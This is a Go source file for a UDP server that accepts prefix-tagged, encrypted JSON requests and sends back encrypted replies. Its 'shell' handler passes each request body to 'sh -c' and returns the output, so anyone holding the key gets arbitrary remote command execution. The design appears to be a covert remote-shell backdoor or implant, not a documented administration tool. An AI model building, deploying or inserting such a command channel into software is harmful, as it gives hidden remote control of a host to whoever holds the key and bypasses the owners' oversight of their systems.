package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os/exec"
)

func Serve(port int, prefix []byte, crypter Crypter) error {
	pc, err := net.ListenPacket("udp4", fmt.Sprintf(":%d", port))
	if err != nil {
		return err
	}
	defer pc.Close()

	log.Printf("Listening UDP at %s\n", pc.LocalAddr())

	buflen := 1024
	buf := make([]byte, buflen)
	for {
		n, addr, err := pc.ReadFrom(buf)
		if err != nil {
			log.Printf("read error: %v", err)
			panic(err)
		}
		log.Printf("received udp from %s\n", addr)

		var req Request
		ok, id := parsePayload(buf[:n], prefix, &req, crypter)
		if !ok {
			log.Println("parse failed")
			continue
		}
		ctx := context.TODO()

		go func() {
			log.Println("request:", req)
			var resp Response
			handler := dispatcher[req.Method]
			if handler != nil {
				body, err := handler(ctx, req.Body)
				if err != nil {
					resp.Code = 999
					resp.Body = err.Error()
				} else {
					resp.Body = body
				}
			}
			respb := buildPayload(prefix, id, resp, crypter)
			pc.WriteTo(respb, addr)
		}()
	}
}

type Request struct {
	Method string
	Body   string
}

type Response struct {
	Body string
	Code int
}

func buildPayload(prefix []byte, id uint64, data interface{}, crypter Crypter) []byte {
	datab, _ := json.Marshal(data)
	idarray := Uint64ToBytes(id)
	cipher := crypter.Encrypt(JoinBytes(idarray[:], datab))
	return JoinBytes(prefix, cipher)
}

func parsePayload(buf []byte, expectPrefix []byte, dst interface{}, crypter Crypter) (ok bool, id uint64) {
	if len(buf) < len(expectPrefix) || !bytes.Equal(buf[:len(expectPrefix)], expectPrefix) {
		return
	}
	cipher := buf[len(expectPrefix):]
	decypted, err := crypter.Decrypt(cipher)
	if err != nil {
		return
	}
	idBuf := [8]byte{}
	dataBuf := make([]byte, len(decypted)-len(idBuf))
	SplitBytes(decypted, idBuf[:], dataBuf)
	err = json.Unmarshal(dataBuf, dst)
	if err != nil {
		log.Println(err)
		return
	}
	return true, BytesToUint64(idBuf)
}

type Handler func(ctx context.Context, body string) (string, error)

var dispatcher = map[string]Handler{
	"echo":  handleEcho,
	"shell": handleShell,
}

func handleEcho(ctx context.Context, body string) (string, error) {
	return body, nil
}

func handleShell(ctx context.Context, body string) (string, error) {
	b, err := exec.Command("sh", "-c", body).CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(b), nil
}
